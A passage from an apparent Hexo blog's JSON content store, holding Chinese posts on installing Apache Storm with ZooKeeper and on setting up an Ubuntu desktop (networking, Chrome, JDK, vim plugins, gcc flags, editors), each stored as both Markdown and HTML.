\"zookeeper-server2\"\n     - \"zookeeper-server3\"\n nimbus.seeds: [\"zookeeper-server1\"]\n\n storm.local.dir: \"/root/Downloads/storm/data\"\n\n supervisor.slots.ports:\n     - 6700\n     - 6701\n     - 6702\n     - 6703\n```\n\n<!-- more -->\n> 每一项配置顶格需要一个空格，所有配置避免使用Tab\n\n3. 启动`nohup bin/storm nimbus &`\n4. 启动`nohup bin/storm supervisor &`\n5. 启动`nohup bin/storm ui &`\n6. 查看`ui`: zookeeper-server1:8080\n7. 运行`WordCount`\n - 下载maven : `wget http://www-eu.apache.org/dist/maven/maven-3/3.5.2/binaries/apache-maven-3.5.2-bin.tar.gz`\n - `tar -zxf apache-maven-3.5.2-bin.tar.gz`\n - 初始化安装storm所需依赖：`mvn clean install -DskipTests=true`\n - 使用Maven打包storm拓扑：`mvn package`\n - 运行`WordCount` : `bin/storm jar storm-starter-1.1.1.jar org.apache.storm.starter.WordCountTopology wordcount`\n","source":"_posts/storm.md","raw":"---\ntitle: Storm\ndate: 2018-01-31 15:18:23\ncategories: 流式计算\ntags:\n  - centos\n  - storm\n  - zookeeper\n---\n\n## 安装zookeeper\n> 安装过程查看文章[http://fenlan.github.io/2017/11/29/zookeeper-kafka/](http://fenlan.github.io/2017/11/29/zookeeper-kafka/)\n\n## 安装Storm\n1. 官网下载Storm\n2. 配置`storm/conf/storm.yaml`\n\n``` bash\n storm.zookeeper.servers:\n     - \"zookeeper-server1\"\n     - \"zookeeper-server2\"\n     - \"zookeeper-server3\"\n nimbus.seeds: [\"zookeeper-server1\"]\n\n storm.local.dir: \"/root/Downloads/storm/data\"\n\n supervisor.slots.ports:\n     - 6700\n     - 6701\n     - 6702\n     - 6703\n```\n\n<!-- more -->\n> 每一项配置顶格需要一个空格，所有配置避免使用Tab\n\n3. 启动`nohup bin/storm nimbus &`\n4. 启动`nohup bin/storm supervisor &`\n5. 启动`nohup bin/storm ui &`\n6. 查看`ui`: zookeeper-server1:8080\n7. 运行`WordCount`\n - 下载maven : `wget http://www-eu.apache.org/dist/maven/maven-3/3.5.2/binaries/apache-maven-3.5.2-bin.tar.gz`\n - `tar -zxf apache-maven-3.5.2-bin.tar.gz`\n - 初始化安装storm所需依赖：`mvn clean install -DskipTests=true`\n - 使用Maven打包storm拓扑：`mvn package`\n - 运行`WordCount` : `bin/storm jar storm-starter-1.1.1.jar org.apache.storm.starter.WordCountTopology wordcount`\n","slug":"storm","published":1,"updated":"2018-01-31T13:08:52.492Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsczq002typ0lpz6rclht","content":"<h2 id=\"安装zookeeper\"><a href=\"#安装zookeeper\" class=\"headerlink\" title=\"安装zookeeper\"></a>安装zookeeper</h2><blockquote>\n<p>安装过程查看文章<a href=\"http://fenlan.github.io/2017/11/29/zookeeper-kafka/\">http://fenlan.github.io/2017/11/29/zookeeper-kafka/</a></p>\n</blockquote>\n<h2 id=\"安装Storm\"><a href=\"#安装Storm\" class=\"headerlink\" title=\"安装Storm\"></a>安装Storm</h2><ol>\n<li>官网下载Storm</li>\n<li>配置<code>storm/conf/storm.yaml</code></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">storm.zookeeper.servers:</span><br><span class=\"line\">    - <span class=\"string\">\"zookeeper-server1\"</span></span><br><span class=\"line\">    - <span class=\"string\">\"zookeeper-server2\"</span></span><br><span class=\"line\">    - <span class=\"string\">\"zookeeper-server3\"</span></span><br><span class=\"line\">nimbus.seeds: [<span class=\"string\">\"zookeeper-server1\"</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">storm.local.dir: <span class=\"string\">\"/root/Downloads/storm/data\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">supervisor.slots.ports:</span><br><span class=\"line\">    - 6700</span><br><span class=\"line\">    - 6701</span><br><span class=\"line\">    - 6702</span><br><span class=\"line\">    - 6703</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<blockquote>\n<p>每一项配置顶格需要一个空格，所有配置避免使用Tab</p>\n</blockquote>\n<ol>\n<li>启动<code>nohup bin/storm nimbus &amp;</code></li>\n<li>启动<code>nohup bin/storm supervisor &amp;</code></li>\n<li>启动<code>nohup bin/storm ui &amp;</code></li>\n<li>查看<code>ui</code>: zookeeper-server1:8080</li>\n<li>运行<code>WordCount</code><ul>\n<li>下载maven : <code>wget http://www-eu.apache.org/dist/maven/maven-3/3.5.2/binaries/apache-maven-3.5.2-bin.tar.gz</code></li>\n<li><code>tar -zxf apache-maven-3.5.2-bin.tar.gz</code></li>\n<li>初始化安装storm所需依赖：<code>mvn clean install -DskipTests=true</code></li>\n<li>使用Maven打包storm拓扑：<code>mvn package</code></li>\n<li>运行<code>WordCount</code> : <code>bin/storm jar storm-starter-1.1.1.jar org.apache.storm.starter.WordCountTopology wordcount</code></li>\n</ul>\n</li>\n</ol>\n","excerpt":"<h2 id=\"安装zookeeper\"><a href=\"#安装zookeeper\" class=\"headerlink\" title=\"安装zookeeper\"></a>安装zookeeper</h2><blockquote>\n<p>安装过程查看文章<a href=\"http://fenlan.github.io/2017/11/29/zookeeper-kafka/\">http://fenlan.github.io/2017/11/29/zookeeper-kafka/</a></p>\n</blockquote>\n<h2 id=\"安装Storm\"><a href=\"#安装Storm\" class=\"headerlink\" title=\"安装Storm\"></a>安装Storm</h2><ol>\n<li>官网下载Storm</li>\n<li>配置<code>storm/conf/storm.yaml</code></li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">storm.zookeeper.servers:</span><br><span class=\"line\">    - <span class=\"string\">\"zookeeper-server1\"</span></span><br><span class=\"line\">    - <span class=\"string\">\"zookeeper-server2\"</span></span><br><span class=\"line\">    - <span class=\"string\">\"zookeeper-server3\"</span></span><br><span class=\"line\">nimbus.seeds: [<span class=\"string\">\"zookeeper-server1\"</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">storm.local.dir: <span class=\"string\">\"/root/Downloads/storm/data\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">supervisor.slots.ports:</span><br><span class=\"line\">    - 6700</span><br><span class=\"line\">    - 6701</span><br><span class=\"line\">    - 6702</span><br><span class=\"line\">    - 6703</span><br></pre></td></tr></table></figure>","more":"<blockquote>\n<p>每一项配置顶格需要一个空格，所有配置避免使用Tab</p>\n</blockquote>\n<ol>\n<li>启动<code>nohup bin/storm nimbus &amp;</code></li>\n<li>启动<code>nohup bin/storm supervisor &amp;</code></li>\n<li>启动<code>nohup bin/storm ui &amp;</code></li>\n<li>查看<code>ui</code>: zookeeper-server1:8080</li>\n<li>运行<code>WordCount</code><ul>\n<li>下载maven : <code>wget http://www-eu.apache.org/dist/maven/maven-3/3.5.2/binaries/apache-maven-3.5.2-bin.tar.gz</code></li>\n<li><code>tar -zxf apache-maven-3.5.2-bin.tar.gz</code></li>\n<li>初始化安装storm所需依赖：<code>mvn clean install -DskipTests=true</code></li>\n<li>使用Maven打包storm拓扑：<code>mvn package</code></li>\n<li>运行<code>WordCount</code> : <code>bin/storm jar storm-starter-1.1.1.jar org.apache.storm.starter.WordCountTopology wordcount</code></li>\n</ul>\n</li>\n</ol>"},{"title":"教训","date":"2016-06-27T07:18:23.000Z","_content":"昨天在百度上下了软件，结果有问题，然后重置电脑，然后后悔了，这个博文只是一个测试。。。","source":"_posts/test.md","raw":"---\ntitle: 教训\ndate: 2016-06-27 15:18:23\n---\n昨天在百度上下了软件，结果有问题，然后重置电脑，然后后悔了，这个博文只是一个测试。。。","slug":"test","published":1,"updated":"2017-11-21T09:23:36.081Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsczr002uyp0l5olwg23u","content":"<p>昨天在百度上下了软件，结果有问题，然后重置电脑，然后后悔了，这个博文只是一个测试。。。</p>\n","excerpt":"","more":"<p>昨天在百度上下了软件，结果有问题，然后重置电脑，然后后悔了，这个博文只是一个测试。。。</p>\n"},{"title":"ubuntu安装配置","date":"2016-08-10T07:18:23.000Z","_content":"\n**想了一下，最终还是将电脑安成windows10 + ubuntu16双系统，以后多用用ubuntu试试。我选择的安装方式使用u盘安装，在安装ubuntu时一直没有选对启动盘制作工具，之前安装windows10的时候使用的是UltraIso，这个安windows没什么问题，但是安装ubuntu时，安不上，后面上网查了很多次，也用了其他的软件，比如linuxLive USB Creator,Universal-USB-Installer等等，其中Universal-usb-installer还是ubuntu推荐的软件，但是仍然不行，就这我折腾了两天还是没成功，后来在qq上的一个业余群里面，有人叫我用USBwriter，结果就成功安装上了。**\n<!--more-->\n\n## ubuntu有线联网\n\n**感觉每一项都挺折腾的，百度google都查了很多，这一步我是在终端完成的**\n```\n$ sudo pppoeconf\n```\n\n**然后根据提示输入用户名和密码就行了**\n\n## Chrome安装\n**很抱歉，我有google强迫症，没它不行，所以直接在官网下载软件包，然后再终端安装**\n```\n$ sudo dpkg -i 软件包名\n```\n**其实有很多安装方式，百度google多问一下就行了**\n\n## 安装软件出现未满足依赖\n**方法就是软件更新器更新，也有这个命令**\n```\n$ sudo apt-get install -f\n$ sudo apt-get update\n```\n**我上面的命令都不管用了，因为我下载了android studio，然后就出问题了，出现没有满足依赖，后来把android studio卸载了才能更新软件包的**\n```\n$ sudo apt-get remove android-studio\n```\n**系统软件包更新后仍然没有安上android studio**\n\n## 安装jdk\n**跟安装chrome一样，不过要配置环境**\n**这里就不浪费时间，直接引用**\n[Ubuntu 11.04,14.04 下安装配置 JDK 7,JDK 8](http://blog.csdn.net/sunlovefly2012/article/details/42747929)\n**具体根据自己的情况去设置**\n\n## chrome翻墙\n**这里有写得很好的博客关于翻墙的**\n[linux-ubuntu使用shadowsocks客户端配置](https://aitanlu.com/ubuntu-shadowsocks-ke-hu-duan-pei-zhi.html#comment-3874)\n\n**里面全部都有，很详细。**\n\n## git安装\n**这个我的博客里有，还有hexo和博客关联都有**\n\n## 安装android studio\n**还在努力中。。。。。**\n**已经完成了，不过并不想写。哎，太懒了，其实也没有多难，只是要配好java环境,然后我的android studio是用命令打开，打开一个后缀是.sh的文件就行**\n\n## vim配置\n**主要是两个文件夹，一个是/etc/vim,一个是~/.vim,具体的还是要多google，我到现在也没弄清楚**\n\n**经过我不懈的努力，终于比较完善了，有代码高亮，自动补全，错误检测，还有nerdtree功能，这些都可以用bundle安装，先安装bundle，然后再在vimrc文件中配置Plugin + 插件，完成后重新打开vim，输入命令PluginInstall就ok。总结一下我用的vim的插件：syntastic(实现代码检测功能)、YouCompleteMe(自动补全最好的插件，没有之一，我这么觉得的)、nerdtree(可以在vim的左侧显示文件目录)，其他的我有点忘了，不过弄好这三个我已经满意了，以后试着有vim,不过讲真，vim还是不太适合写较大的程序，我这么觉得的**\n\n## gcc编译器问题\n**最近我自己写了一些代码，有自己定义的头文件，在ubuntu中用gcc编译器编译时总是出现许多对‘XXX’未定义的引用，我疑惑了很久，后来意外的解决了，一个原因是要编译多个源文件的程序时，所有的源文件都要放在一起编译，还有就是用math.h头文件时要在命令最后加上-lm,还有用ncurses.h头文件时也要用-lcurses,什么原因要是要google搜搜，最后吐槽一下自己，发现自己已经在c这门语言的路上越走越远，我并不想这样，感觉写什么程序都要被迫用c，我想学用python,java。然而到目前为止，我仍然对他们很陌生，好苦逼**\n\n## atom编辑器\n**[atom](http://www.jianshu.com/p/b4c8479cfaa5)是一个类似sublime text的编译器，但是个人观点atom好看到无解，好用好看，是真的好。这是我强烈推荐的一款软件，不用真的会后悔，这还是寝室大神告诉我的，我偶然看见他在用，就问是什么编译器。我推荐给另一个人的时候，他居然居然说什么编译器都一样，只要能用就行。我愣了！他还在用Dev，有visual studio这样强大的东西，又有atom那么好看的东西，他居然还在用Dev。反正我是无法理解。**\n\n## 主题推荐\n**ubuntu上主题好看的不少，个人钟情与flatabulous，这个主题满足了我的个人审美，具体操作看这篇博文： http://www.jcodecraeer.com/a/chengxusheji/chengxuyuan/2015/0923/3502.html**\n\n## ubuntu配置QQ\n**之前试过好多次没成功，意外之间找到了一个网站便用上了，能满足一般的QQ要求，跟windows的QQ很像，网站如下： http://ttop5.net/?p=1316**\n\n## ubuntu写markdown工具\n**推荐haroopad，很好用，可以实时显示效果,推荐博文： http://www.jianshu.com/p/064aec7a5164**","source":"_posts/ubuntu安装与配置.md","raw":"---\ntitle: ubuntu安装配置\ndate: 2016-08-10 15:18:23\ncategories: linux\ntags:\n  - vim\n  - ubuntu\n---\n\n**想了一下，最终还是将电脑安成windows10 + ubuntu16双系统，以后多用用ubuntu试试。我选择的安装方式使用u盘安装，在安装ubuntu时一直没有选对启动盘制作工具，之前安装windows10的时候使用的是UltraIso，这个安windows没什么问题，但是安装ubuntu时，安不上，后面上网查了很多次，也用了其他的软件，比如linuxLive USB Creator,Universal-USB-Installer等等，其中Universal-usb-installer还是ubuntu推荐的软件，但是仍然不行，就这我折腾了两天还是没成功，后来在qq上的一个业余群里面，有人叫我用USBwriter，结果就成功安装上了。**\n<!--more-->\n\n## ubuntu有线联网\n\n**感觉每一项都挺折腾的，百度google都查了很多，这一步我是在终端完成的**\n```\n$ sudo pppoeconf\n```\n\n**然后根据提示输入用户名和密码就行了**\n\n## Chrome安装\n**很抱歉，我有google强迫症，没它不行，所以直接在官网下载软件包，然后再终端安装**\n```\n$ sudo dpkg -i 软件包名\n```\n**其实有很多安装方式，百度google多问一下就行了**\n\n## 安装软件出现未满足依赖\n**方法就是软件更新器更新，也有这个命令**\n```\n$ sudo apt-get install -f\n$ sudo apt-get update\n```\n**我上面的命令都不管用了，因为我下载了android studio，然后就出问题了，出现没有满足依赖，后来把android studio卸载了才能更新软件包的**\n```\n$ sudo apt-get remove android-studio\n```\n**系统软件包更新后仍然没有安上android studio**\n\n## 安装jdk\n**跟安装chrome一样，不过要配置环境**\n**这里就不浪费时间，直接引用**\n[Ubuntu 11.04,14.04 下安装配置 JDK 7,JDK 8](http://blog.csdn.net/sunlovefly2012/article/details/42747929)\n**具体根据自己的情况去设置**\n\n## chrome翻墙\n**这里有写得很好的博客关于翻墙的**\n[linux-ubuntu使用shadowsocks客户端配置](https://aitanlu.com/ubuntu-shadowsocks-ke-hu-duan-pei-zhi.html#comment-3874)\n\n**里面全部都有，很详细。**\n\n## git安装\n**这个我的博客里有，还有hexo和博客关联都有**\n\n## 安装android studio\n**还在努力中。。。。。**\n**已经完成了，不过并不想写。哎，太懒了，其实也没有多难，只是要配好java环境,然后我的android studio是用命令打开，打开一个后缀是.sh的文件就行**\n\n## vim配置\n**主要是两个文件夹，一个是/etc/vim,一个是~/.vim,具体的还是要多google，我到现在也没弄清楚**\n\n**经过我不懈的努力，终于比较完善了，有代码高亮，自动补全，错误检测，还有nerdtree功能，这些都可以用bundle安装，先安装bundle，然后再在vimrc文件中配置Plugin + 插件，完成后重新打开vim，输入命令PluginInstall就ok。总结一下我用的vim的插件：syntastic(实现代码检测功能)、YouCompleteMe(自动补全最好的插件，没有之一，我这么觉得的)、nerdtree(可以在vim的左侧显示文件目录)，其他的我有点忘了，不过弄好这三个我已经满意了，以后试着有vim,不过讲真，vim还是不太适合写较大的程序，我这么觉得的**\n\n## gcc编译器问题\n**最近我自己写了一些代码，有自己定义的头文件，在ubuntu中用gcc编译器编译时总是出现许多对‘XXX’未定义的引用，我疑惑了很久，后来意外的解决了，一个原因是要编译多个源文件的程序时，所有的源文件都要放在一起编译，还有就是用math.h头文件时要在命令最后加上-lm,还有用ncurses.h头文件时也要用-lcurses,什么原因要是要google搜搜，最后吐槽一下自己，发现自己已经在c这门语言的路上越走越远，我并不想这样，感觉写什么程序都要被迫用c，我想学用python,java。然而到目前为止，我仍然对他们很陌生，好苦逼**\n\n## atom编辑器\n**[atom](http://www.jianshu.com/p/b4c8479cfaa5)是一个类似sublime text的编译器，但是个人观点atom好看到无解，好用好看，是真的好。这是我强烈推荐的一款软件，不用真的会后悔，这还是寝室大神告诉我的，我偶然看见他在用，就问是什么编译器。我推荐给另一个人的时候，他居然居然说什么编译器都一样，只要能用就行。我愣了！他还在用Dev，有visual studio这样强大的东西，又有atom那么好看的东西，他居然还在用Dev。反正我是无法理解。**\n\n## 主题推荐\n**ubuntu上主题好看的不少，个人钟情与flatabulous，这个主题满足了我的个人审美，具体操作看这篇博文： http://www.jcodecraeer.com/a/chengxusheji/chengxuyuan/2015/0923/3502.html**\n\n## ubuntu配置QQ\n**之前试过好多次没成功，意外之间找到了一个网站便用上了，能满足一般的QQ要求，跟windows的QQ很像，网站如下： http://ttop5.net/?p=1316**\n\n## ubuntu写markdown工具\n**推荐haroopad，很好用，可以实时显示效果,推荐博文： http://www.jianshu.com/p/064aec7a5164**","slug":"ubuntu安装与配置","published":1,"updated":"2017-11-28T03:29:25.441Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsczt002yyp0lksad4tyd","content":"<p><strong>想了一下，最终还是将电脑安成windows10 + ubuntu16双系统，以后多用用ubuntu试试。我选择的安装方式使用u盘安装，在安装ubuntu时一直没有选对启动盘制作工具，之前安装windows10的时候使用的是UltraIso，这个安windows没什么问题，但是安装ubuntu时，安不上，后面上网查了很多次，也用了其他的软件，比如linuxLive USB Creator,Universal-USB-Installer等等，其中Universal-usb-installer还是ubuntu推荐的软件，但是仍然不行，就这我折腾了两天还是没成功，后来在qq上的一个业余群里面，有人叫我用USBwriter，结果就成功安装上了。</strong><br><a id=\"more\"></a></p>\n<h2 id=\"ubuntu有线联网\"><a href=\"#ubuntu有线联网\" class=\"headerlink\" title=\"ubuntu有线联网\"></a>ubuntu有线联网</h2><p><strong>感觉每一项都挺折腾的，百度google都查了很多，这一步我是在终端完成的</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo pppoeconf</span><br></pre></td></tr></table></figure></p>\n<p><strong>然后根据提示输入用户名和密码就行了</strong></p>\n<h2 id=\"Chrome安装\"><a href=\"#Chrome安装\" class=\"headerlink\" title=\"Chrome安装\"></a>Chrome安装</h2><p><strong>很抱歉，我有google强迫症，没它不行，所以直接在官网下载软件包，然后再终端安装</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo dpkg -i 软件包名</span><br></pre></td></tr></table></figure></p>\n<p><strong>其实有很多安装方式，百度google多问一下就行了</strong></p>\n<h2 id=\"安装软件出现未满足依赖\"><a href=\"#安装软件出现未满足依赖\" class=\"headerlink\" title=\"安装软件出现未满足依赖\"></a>安装软件出现未满足依赖</h2><p><strong>方法就是软件更新器更新，也有这个命令</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo apt-get install -f</span><br><span class=\"line\">$ sudo apt-get update</span><br></pre></td></tr></table></figure></p>\n<p><strong>我上面的命令都不管用了，因为我下载了android studio，然后就出问题了，出现没有满足依赖，后来把android studio卸载了才能更新软件包的</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo apt-get remove android-studio</span><br></pre></td></tr></table></figure></p>\n<p><strong>系统软件包更新后仍然没有安上android studio</strong></p>\n<h2 id=\"安装jdk\"><a href=\"#安装jdk\" class=\"headerlink\" title=\"安装jdk\"></a>安装jdk</h2><p><strong>跟安装chrome一样，不过要配置环境</strong><br><strong>这里就不浪费时间，直接引用</strong><br><a href=\"http://blog.csdn.net/sunlovefly2012/article/details/42747929\" target=\"_blank\" rel=\"external\">Ubuntu 11.04,14.04 下安装配置 JDK 7,JDK 8</a><br><strong>具体根据自己的情况去设置</strong></p>\n<h2 id=\"chrome翻墙\"><a href=\"#chrome翻墙\" class=\"headerlink\" title=\"chrome翻墙\"></a>chrome翻墙</h2><p><strong>这里有写得很好的博客关于翻墙的</strong><br><a href=\"https://aitanlu.com/ubuntu-shadowsocks-ke-hu-duan-pei-zhi.html#comment-3874\" target=\"_blank\" rel=\"external\">linux-ubuntu使用shadowsocks客户端配置</a></p>\n<p><strong>里面全部都有，很详细。</strong></p>\n<h2 id=\"git安装\"><a href=\"#git安装\" class=\"headerlink\" title=\"git安装\"></a>git安装</h2><p><strong>这个我的博客里有，还有hexo和博客关联都有</strong></p>\n<h2 id=\"安装android-studio\"><a href=\"#安装android-studio\" class=\"headerlink\" title=\"安装android studio\"></a>安装android studio</h2><p><strong>还在努力中。。。。。</strong><br><strong>已经完成了，不过并不想写。哎，太懒了，其实也没有多难，只是要配好java环境,然后我的android studio是用命令打开，打开一个后缀是.sh的文件就行</strong></p>\n<h2 id=\"vim配置\"><a href=\"#vim配置\" class=\"headerlink\" title=\"vim配置\"></a>vim配置</h2><p><strong>主要是两个文件夹，一个是/etc/vim,一个是~/.vim,具体的还是要多google，我到现在也没弄清楚</strong></p>\n<p><strong>经过我不懈的努力，终于比较完善了，有代码高亮，自动补全，错误检测，还有nerdtree功能，这些都可以用bundle安装，先安装bundle，然后再在vimrc文件中配置Plugin + 插件，完成后重新打开vim，输入命令PluginInstall就ok。总结一下我用的vim的插件：syntastic(实现代码检测功能)、YouCompleteMe(自动补全最好的插件，没有之一，我这么觉得的)、nerdtree(可以在vim的左侧显示文件目录)，其他的我有点忘了，不过弄好这三个我已经满意了，以后试着有vim,不过讲真，vim还是不太适合写较大的程序，我这么觉得的</strong></p>\n<h2 id=\"gcc编译器问题\"><a href=\"#gcc编译器问题\" class=\"headerlink\" title=\"gcc编译器问题\"></a>gcc编译器问题</h2><p><strong>最近我自己写了一些代码，有自己定义的头文件，在ubuntu中用gcc编译器编译时总是出现许多对‘XXX’未定义的引用，我疑惑了很久，后来意外的解决了，一个原因是要编译多个源文件的程序时，所有的源文件都要放在一起编译，还有就是用math.h头文件时要在命令最后加上-lm,还有用ncurses.h头文件时也要用-lcurses,什么原因要是要google搜搜，最后吐槽一下自己，发现自己已经在c这门语言的路上越走越远，我并不想这样，感觉写什么程序都要被迫用c，我想学用python,java。然而到目前为止，我仍然对他们很陌生，好苦逼</strong></p>\n<h2 id=\"atom编辑器\"><a href=\"#atom编辑器\" class=\"headerlink\" title=\"atom编辑器\"></a>atom编辑器</h2><p><strong><a href=\"http://www.jianshu.com/p/b4c8479cfaa5\" target=\"_blank\" rel=\"external\">atom</a>是一个类似sublime text的编译器，但是个人观点atom好看到无解，好用好看，是真的好。这是我强烈推荐的一款软件，不用真的会后悔，这还是寝室大神告诉我的，我偶然看见他在用，就问是什么编译器。我推荐给另一个人的时候，他居然居然说什么编译器都一样，只要能用就行。我愣了！他还在用Dev，有visual studio这样强大的东西，又有atom那么好看的东西，他居然还在用Dev。反正我是无法理解。</strong></p>\n<h2 id=\"主题推荐\"><a href=\"#主题推荐\" class=\"headerlink\" title=\"主题推荐\"></a>主题推荐</h2><p><strong>ubuntu上主题好看的不少，个人钟情与flatabulous，这个主题满足了我的个人审美，具体操作看这篇博文： <a href=\"http://www.jcodecraeer.com/a/chengxusheji/chengxuyuan/2015/0923/3502.html\" target=\"_blank\" rel=\"external\">http://www.jcodecraeer.com/a/chengxusheji/chengxuyuan/2015/0923/3502.html</a></strong></p>\n<h2 id=\"ubuntu配置QQ\"><a href=\"#ubuntu配置QQ\" class=\"headerlink\" title=\"ubuntu配置QQ\"></a>ubuntu配置QQ</h2><p><strong>之前试过好多次没成功，意外之间找到了一个网站便用上了，能满足一般的QQ要求，跟windows的QQ很像，网站如下： <a href=\"http://ttop5.net/?p=1316\" target=\"_blank\" rel=\"external\">http://ttop5.net/?p=1316</a></strong></p>\n<h2 id=\"ubuntu写markdown工具\"><a href=\"#ubuntu写markdown工具\" class=\"headerlink\" title=\"ubuntu写markdown工具\"></a>ubuntu写markdown工具</h2><p><strong>推荐haroopad，很好用，可以实时显示效果,推荐博文： <a href=\"http://www.jianshu.com/p/064aec7a5164\" target=\"_blank\" rel=\"external\">http://www.jianshu.com/p/064aec7a5164</a></strong></p>\n","excerpt":"<p><strong>想了一下，最终还是将电脑安成windows10 + ubuntu16双系统，以后多用用ubuntu试试。我选择的安装方式使用u盘安装，在安装ubuntu时一直没有选对启动盘制作工具，之前安装windows10的时候使用的是UltraIso，这个安windows没什么问题，但是安装ubuntu时，安不上，后面上网查了很多次，也用了其他的软件，比如linuxLive USB Creator,Universal-USB-Installer等等，其中Universal-usb-installer还是ubuntu推荐的软件，但是仍然不行，就这我折腾了两天还是没成功，后来在qq上的一个业余群里面，有人叫我用USBwriter，结果就成功安装上了。</strong><br>","more":"</p>\n<h2 id=\"ubuntu有线联网\"><a href=\"#ubuntu有线联网\" class=\"headerlink\" title=\"ubuntu有线联网\"></a>ubuntu有线联网</h2><p><strong>感觉每一项都挺折腾的，百度google都查了很多，这一步我是在终端完成的</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo pppoeconf</span><br></pre></td></tr></table></figure></p>\n<p><strong>然后根据提示输入用户名和密码就行了</strong></p>\n<h2 id=\"Chrome安装\"><a href=\"#Chrome安装\" class=\"headerlink\" title=\"Chrome安装\"></a>Chrome安装</h2><p><strong>很抱歉，我有google强迫症，没它不行，所以直接在官网下载软件包，然后再终端安装</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo dpkg -i 软件包名</span><br></pre></td></tr></table></figure></p>\n<p><strong>其实有很多安装方式，百度google多问一下就行了</strong></p>\n<h2 id=\"安装软件出现未满足依赖\"><a href=\"#安装软件出现未满足依赖\" class=\"headerlink\" title=\"安装软件出现未满足依赖\"></a>安装软件出现未满足依赖</h2><p><strong>方法就是软件更新器更新，也有这个命令</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo apt-get install -f</span><br><span class=\"line\">$ sudo apt-get update</span><br></pre></td></tr></table></figure></p>\n<p><strong>我上面的命令都不管用了，因为我下载了android studio，然后就出问题了，出现没有满足依赖，后来把android studio卸载了才能更新软件包的</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo apt-get remove android-studio</span><br></pre></td></tr></table></figure></p>\n<p><strong>系统软件包更新后仍然没有安上android studio</strong></p>\n<h2 id=\"安装jdk\"><a href=\"#安装jdk\" class=\"headerlink\" title=\"安装jdk\"></a>安装jdk</h2><p><strong>跟安装chrome一样，不过要配置环境</strong><br><strong>这里就不浪费时间，直接引用</strong><br><a href=\"http://blog.csdn.net/sunlovefly2012/article/details/42747929\">Ubuntu 11.04,14.04 下安装配置 JDK 7,JDK 8</a><br><strong>具体根据自己的情况去设置</strong></p>\n<h2 id=\"chrome翻墙\"><a href=\"#chrome翻墙\" class=\"headerlink\" title=\"chrome翻墙\"></a>chrome翻墙</h2><p><strong>这里有写得很好的博客关于翻墙的</strong><br><a href=\"https://aitanlu.com/ubuntu-shadowsocks-ke-hu-duan-pei-zhi.html#comment-3874\">linux-ubuntu使用shadowsocks客户端配置</a></p>\n<p><strong>里面全部都有，很详细。</strong></p>\n<h2 id=\"git安装\"><a href=\"#git安装\" class=\"headerlink\" title=\"git安装\"></a>git安装</h2><p><strong>这个我的博客里有，还有hexo和博客关联都有</strong></p>\n<h2 id=\"安装android-studio\"><a href=\"#安装android-studio\" class=\"headerlink\" title=\"安装android studio\"></a>安装android studio</h2><p><strong>还在努力中。。。。。</strong><br><strong>已经完成了，不过并不想写。哎，太懒了，其实也没有多难，只是要配好java环境,然后我的android studio是用命令打开，打开一个后缀是.sh的文件就行</strong></p>\n<h2 id=\"vim配置\"><a href=\"#vim配置\" class=\"headerlink\" title=\"vim配置\"></a>vim配置</h2><p><strong>主要是两个文件夹，一个是/etc/vim,一个是~/.vim,具体的还是要多google，我到现在也没弄清楚</strong></p>\n<p><strong>经过我不懈的努力，终于比较完善了，有代码高亮，自动补全，错误检测，还有nerdtree功能，这些都可以用bundle安装，先安装bundle，然后再在vimrc文件中配置Plugin + 插件，完成后重新打开vim，输入命令PluginInstall就ok。总结一下我用的vim的插件：syntastic(实现代码检测功能)、YouCompleteMe(自动补全最好的插件，没有之一，我这么觉得的)、nerdtree(可以在vim的左侧显示文件目录)，其他的我有点忘了，不过弄好这三个我已经满意了，以后试着有vim,不过讲真，vim还是不太适合写较大的程序，我这么觉得的</strong></p>\n<h2 id=\"gcc编译器问题\"><a href=\"#gcc编译器问题\" class=\"headerlink\" 